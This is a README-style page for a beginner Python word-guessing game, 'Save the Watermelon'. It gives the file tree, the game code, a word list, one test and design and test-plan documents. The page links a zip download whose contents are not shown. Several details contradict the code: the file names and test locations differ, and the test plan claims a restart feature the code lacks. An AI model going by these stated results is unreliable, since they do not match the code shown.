
# Save the Watermelon - Python Project
### Save The Water Melon Zip: [save-the-watermelon.zip](https://github.com/user-attachments/files/22994747/save-the-watermelon.zip)
## Repository Structure
```python
save-the-watermelon/
├─ README.md
├─ LICENSE
├─ .gitignore
├─ src/
│  ├─ game.py
│  ├─ logic.py
│  ├─ words.py
│  └─ __init__.py
├─ tests/
│  ├─ test_logic.py
│  └─ __init__.py
├─ docs/
│  ├─ design.md
│  ├─ pseudocode.md
│  ├─ test-plan.md
│  └─ screenshots/
└─ data/
   └─ words.txt
```
## src/game.py
```python
"""Entry point for Save the Watermelon game."""

from src.logic import play_game

if __name__ == "__main__":
    play_game()
```
## src/logic.py
```python
"""Core logic for Save the Watermelon."""

import random
from src.words import WORD_LIST

MAX_SLICES = 6

def select_secret_word():
    return random.choice(WORD_LIST)

def display_word(secret, guessed):
    return " ".join([letter if letter in guessed else "_" for letter in secret])

def play_game():
    secret = select_secret_word()
    guessed = set()
    slices = MAX_SLICES

    print("🍉 Welcome to Save the Watermelon!")
    print("Guess the word before the watermelon gets sliced!")

    while slices > 0:
        print("\nWord:", display_word(secret, guessed))
        print(f"Slices left: {slices}")
        guess = input("Enter a letter: ").lower()

        if not guess.isalpha() or len(guess) != 1:
            print("Please enter a single letter (a-z).")
            continue

        if guess in guessed:
            print("You already guessed that letter!")
            continue

        guessed.add(guess)

        if guess in secret:
            print("Nice guess!")
        else:
            slices -= 1
            print("Wrong! The watermelon got a slice...")

        if all(letter in guessed for letter in secret):
            print(f"\n🥳 You saved the watermelon! The word was '{secret}'.")
            break
    else:
        print(f"\n☠️ The melon was sliced! The word was '{secret}'.")
```
## src/word.py
```
python
"""Word list for Save the Watermelon."""

WORD_LIST = [
    "slicing",
    "watermelon",
    "slice",
    "seeds",
    "python",
    "student",
    "juicy",
    "round"
]
```
## data/words.txt
```python
"slicing",
"watermelon",
"slice",
"seeds",
"python",
"student",
"juicy",
"round"
```
## src/test_logic.py
```python
"""Tests for logic.py functions."""

from src.logic import display_word

def test_display_word():
    secret = "apple"
    guessed = {"a", "p"}
    assert display_word(secret, guessed) == "a p p _ _"
```
## docs/design.md
```python
# Design Document (Progression 1)

## Problem Statement
Players must guess the secret word before the watermelon gets fully sliced.
Each incorrect guess removes one slice.

## Target Audience
Casual players and Python beginners learning loops, conditionals, and functions.

## Game Rules
- Guess letters to reveal the word.
- Each wrong guess removes a slice.
- Lose when slices = 0.
- Win when the full word is revealed.

## Core Features
- Random word selection  
- Guess tracking  
- Slice counter  
- Win/lose messages  

## Stretch Goals
- ASCII watermelon art  
- Difficulty settings  
- Scoreboard or hints  

## Data Design
- `secret`: string  
- `guessed`: set  
- `slices`: int  
- `MAX_SLICES`: constant  

## Module Responsibilities
- `game.py`: runs the game  
- `logic.py`: handles gameplay logic  
- `words.py`: stores word list
```
## docs/pseudocode.md
```python
# Pseudocode (Progression 2)

FUNCTION play_game
  secret ← random word
  guessed ← empty set
  slices ← MAX_SLICES

  PRINT welcome message

  WHILE slices > 0 AND word not complete
    DISPLAY masked word
    guess ← user input
    IF invalid input THEN repeat
    IF guess already guessed THEN notify
    ADD guess to guessed
    IF guess in word THEN display success
    ELSE slices ← slices - 1
    IF word fully revealed THEN player wins

  IF slices = 0 THEN player loses
END FUNCTION
```
## Progression 3
🎯 To run:
```python
python -m src.game
```
```python
save-the-watermelon/
└─ src/
   ├─ game.py
   ├─ logic.py
   ├─ words.py
   └─ __init__.py
```
## docs/test-plan.md
```python
# Test Plan (Progression 4)

## Manual Test Matrix

| Test Case | Input | Expected Output |
|------------|--------|----------------|
| Valid guess | `w` | Reveals all 'a's in word |
| Invalid input | `1` | "Please enter a letter" |
| Repeat guess | `w` twice | "Already guessed" |
| Win condition | All letters guessed | "You saved the watermelon!" |
| Lose condition | Too many wrong guesses | "The melon was sliced!" |

## Manual Test Results
✅ All core gameplay functions as expected.  
✅ Input validation works.  
✅ Game restarts cleanly.
```
